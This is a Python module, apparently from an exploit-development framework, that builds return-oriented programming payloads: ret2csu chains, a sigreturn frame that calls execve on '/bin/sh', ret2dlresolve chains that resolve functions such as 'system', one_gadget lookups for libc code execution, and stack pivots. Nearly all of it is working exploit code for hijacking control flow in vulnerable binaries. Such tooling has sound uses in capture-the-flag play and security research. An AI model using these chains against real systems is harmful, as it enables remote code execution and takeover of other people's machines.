"""
Advanced ROP techniques: ret2csu, SROP, ret2dlresolve.
"""

from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.exploit.rop.gadgets import GadgetFinder
from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class CSUGadgets:
    """Gadgets from __libc_csu_init."""
    gadget1: int = 0  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    gadget2: int = 0  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]


class ROPTechniques:
    """
    Advanced ROP exploitation techniques.

    Implements:
    - ret2csu: Use __libc_csu_init gadgets
    - SROP: Sigreturn-oriented programming
    - ret2dlresolve: Resolve arbitrary function
    """

    def __init__(self, binary: Binary):
        """
        Initialize techniques.

        Args:
            binary: Target binary
        """
        self.binary = binary
        self.bits = binary.bits if binary else 64
        self.pack = p64 if self.bits == 64 else p32
        self.gadget_finder = GadgetFinder(binary)

    def ret2csu(
        self,
        call_addr: int,
        arg1: int = 0,
        arg2: int = 0,
        arg3: int = 0,
    ) -> Optional[bytes]:
        """
        Build ret2csu chain.

        Uses __libc_csu_init gadgets for argument control.

        Args:
            call_addr: Address to call (must be in GOT-style table)
            arg1: First argument (rdi/edi)
            arg2: Second argument (rsi)
            arg3: Third argument (rdx)

        Returns:
            ROP chain bytes
        """
        if self.bits != 64:
            logger.warning("ret2csu only works on 64-bit binaries")
            return None

        # Find __libc_csu_init
        csu_init = self.binary.symbols.get("__libc_csu_init")
        if not csu_init:
            logger.warning("__libc_csu_init not found")
            return None

        csu_addr = csu_init.address if hasattr(csu_init, 'address') else csu_init

        # Gadgets are at specific offsets within __libc_csu_init
        # These offsets can vary, so we search for patterns

        gadgets = self._find_csu_gadgets(csu_addr)
        if not gadgets.gadget1 or not gadgets.gadget2:
            logger.warning("Could not find CSU gadgets")
            return None

        chain = []

        # Gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        chain.append(self.pack(gadgets.gadget1))
        chain.append(self.pack(0))            # rbx = 0
        chain.append(self.pack(1))            # rbp = 1 (for the cmp later)
        chain.append(self.pack(call_addr))    # r12 = address to call
        chain.append(self.pack(arg1))         # r13 -> edi
        chain.append(self.pack(arg2))         # r14 -> rsi
        chain.append(self.pack(arg3))         # r15 -> rdx

        # Gadget 2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
        chain.append(self.pack(gadgets.gadget2))

        # After call, needs 7 more pops (add rsp, 8; pop rbx..r15; ret)
        chain.extend([self.pack(0)] * 7)

        return b"".join(chain)

    def _find_csu_gadgets(self, csu_addr: int) -> CSUGadgets:
        """
        Find gadgets within __libc_csu_init.

        Args:
            csu_addr: Address of __libc_csu_init

        Returns:
            CSUGadgets with found addresses
        """
        gadgets = CSUGadgets()

        # Common offsets (may need adjustment)
        # Gadget 1 is usually near the end
        # Gadget 2 is usually in the middle

        try:
            # Read function bytes
            func_bytes = self.binary.read(csu_addr, 0x80)

            # Search for gadget patterns
            # Gadget 1: 5b 5d 41 5c 41 5d 41 5e 41 5f c3
            # (pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret)
            g1_pattern = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3])
            g1_offset = func_bytes.find(g1_pattern)
            if g1_offset >= 0:
                gadgets.gadget1 = csu_addr + g1_offset

            # Gadget 2: 4c 89 fa 4c 89 f6 44 89 ef
            # (mov rdx, r15; mov rsi, r14; mov edi, r13d)
            g2_pattern = bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef])
            g2_offset = func_bytes.find(g2_pattern)
            if g2_offset >= 0:
                gadgets.gadget2 = csu_addr + g2_offset

        except Exception as e:
            logger.debug(f"Failed to find CSU gadgets: {e}")

        return gadgets

    def srop_execve(
        self,
        cmd_addr: int = 0,
    ) -> Optional[bytes]:
        """
        Build SROP chain for execve.

        Uses sigreturn to set all registers at once.

        Args:
            cmd_addr: Address of "/bin/sh" string

        Returns:
            ROP chain bytes
        """
        if self.bits != 64:
            logger.warning("SROP implementation is 64-bit only")
            return None

        # Find sigreturn gadget
        # Can be syscall with rax=15, or direct sigreturn
        syscall = self.gadget_finder.find_syscall()
        pop_rax = self.gadget_finder.find_pop_reg("rax")

        if not syscall:
            logger.warning("No syscall gadget for SROP")
            return None

        chain = []

        # Set rax = 15 (sigreturn syscall number)
        if pop_rax:
            chain.append(self.pack(pop_rax.address))
            chain.append(self.pack(15))

        chain.append(self.pack(syscall.address))

        # Build sigreturn frame
        frame = self._build_sigreturn_frame(
            rax=59,           # execve
            rdi=cmd_addr,     # filename
            rsi=0,            # argv
            rdx=0,            # envp
            rip=syscall.address,  # Return to syscall
        )

        chain.append(frame)

        return b"".join(chain)

    def _build_sigreturn_frame(
        self,
        rax: int = 0,
        rdi: int = 0,
        rsi: int = 0,
        rdx: int = 0,
        rip: int = 0,
        rsp: int = 0,
        **kwargs,
    ) -> bytes:
        """
        Build sigreturn frame structure.

        Args:
            Register values to set

        Returns:
            Frame bytes
        """
        # x86_64 sigcontext structure offsets
        # This is the Linux x86_64 signal frame layout

        frame = bytearray(0x100)  # sigcontext size

        def write64(offset: int, value: int):
            frame[offset:offset + 8] = value.to_bytes(8, 'little')

        # Register offsets in sigcontext (may vary by kernel version)
        write64(0x28, rdi)   # rdi
        write64(0x30, rsi)   # rsi
        write64(0x38, rdx)   # rdx
        write64(0x40, 0)     # rcx
        write64(0x48, rax)   # rax
        write64(0x60, rsp)   # rsp
        write64(0x68, rip)   # rip
        write64(0x88, 0x33)  # cs (user code segment)
        write64(0x90, 0)     # flags
        write64(0x98, 0x2b)  # ss (user stack segment)

        return bytes(frame)

    def ret2dlresolve(
        self,
        func_name: str,
        args: List[int],
    ) -> Optional[bytes]:
        """
        Build ret2dlresolve chain.

        Resolves arbitrary function without libc leak.

        Args:
            func_name: Function to resolve (e.g., "system")
            args: Function arguments

        Returns:
            ROP chain bytes
        """
        # ret2dlresolve is complex and requires:
        # 1. Control of writable memory for fake structures
        # 2. Specific binary layout knowledge

        try:
            from pwn import Ret2dlresolvePayload, ROP, context

            context.binary = self.binary._elf

            # Create payload using pwntools
            dlresolve = Ret2dlresolvePayload(
                self.binary._elf,
                symbol=func_name,
                args=args,
            )

            rop = ROP(self.binary._elf)

            # Read function (like read) to write payload
            if "read" in self.binary.plt:
                rop.call("read", [0, dlresolve.data_addr, len(dlresolve.payload)])

            # Stack pivot if needed
            rop.ret2dlresolve(dlresolve)

            return rop.chain()

        except Exception as e:
            logger.error(f"ret2dlresolve failed: {e}")
            return None

    def one_gadget(
        self,
        libc_path: str,
        libc_base: int = 0,
    ) -> List[int]:
        """
        Find one-gadget RCE in libc.

        Args:
            libc_path: Path to libc
            libc_base: Libc base address

        Returns:
            List of one-gadget addresses
        """
        import subprocess

        try:
            result = subprocess.run(
                ["one_gadget", libc_path],
                capture_output=True,
                text=True,
                timeout=60,
            )

            gadgets = []
            for line in result.stdout.split("\n"):
                if line.startswith("0x"):
                    offset = int(line.split()[0], 16)
                    gadgets.append(libc_base + offset)

            return gadgets

        except FileNotFoundError:
            logger.warning("one_gadget tool not found")
        except Exception as e:
            logger.error(f"one_gadget failed: {e}")

        return []

    def stack_pivot(
        self,
        target_rsp: int,
    ) -> Optional[bytes]:
        """
        Build stack pivot chain.

        Args:
            target_rsp: New stack pointer value

        Returns:
            ROP chain bytes
        """
        chain = []
        finder = self.gadget_finder

        # Method 1: pop rsp; ret
        pop_rsp = finder.find_pop_rsp()
        if pop_rsp:
            chain.append(self.pack(pop_rsp.address))
            chain.append(self.pack(target_rsp))
            return b"".join(chain)

        # Method 2: leave; ret (sets rsp = rbp)
        leave_ret = finder.find_leave_ret()
        if leave_ret:
            # Need to control rbp first
            pop_rbp = finder.find_pop_reg("rbp")
            if pop_rbp:
                chain.append(self.pack(pop_rbp.address))
                chain.append(self.pack(target_rsp))
                chain.append(self.pack(leave_ret.address))
                return b"".join(chain)

        # Method 3: xchg rsp, rax
        xchg = finder.find_xchg_rsp("rax")
        if xchg:
            pop_rax = finder.find_pop_reg("rax")
            if pop_rax:
                chain.append(self.pack(pop_rax.address))
                chain.append(self.pack(target_rsp))
                chain.append(self.pack(xchg.address))
                return b"".join(chain)

        logger.warning("No stack pivot gadgets found")
        return None

    def summary(self) -> str:
        """Get techniques summary."""
        return f"""
ROP Techniques
==============
Binary: {self.binary.path.name if self.binary else 'None'}

Available techniques:
- ret2csu: {'Yes' if '__libc_csu_init' in (self.binary.symbols if self.binary else {}) else 'No'}
- SROP: {'Yes' if self.gadget_finder.find_syscall() else 'No'}
- Stack pivot: {'Yes' if self.gadget_finder.find_leave_ret() else 'No'}
"""
